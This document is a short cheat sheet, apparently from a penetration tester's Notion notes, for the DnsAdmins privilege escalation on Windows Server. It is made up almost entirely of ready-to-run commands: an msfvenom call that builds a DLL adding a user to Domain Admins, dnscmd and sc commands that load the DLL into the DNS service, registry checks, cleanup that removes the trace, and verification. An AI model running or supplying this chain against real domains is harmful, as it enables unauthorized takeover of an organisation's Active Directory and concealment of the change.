# DNSAdmin Windows Server Exploit

OS: Windows
Description: Load malicious DLL with dnscmd.exe
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### DNS Admin

### Generate dll that adds a user to the dns admin group

```jsx
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

### Run DLL to add user to Domain Admin group

```jsx
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
sc.exe start dns
(This will break the dns server)
```

### Enumerate DNSAdmins

```jsx
 Get-ADGroupMember -Identity DnsAdmins
```

### Verifying out DLL was added

```jsx
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

### Cleaning it up

```jsx
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
sc stop dns
sc start dns

```

### Verify Membership

```jsx
net group "Domain Admins" /dom
```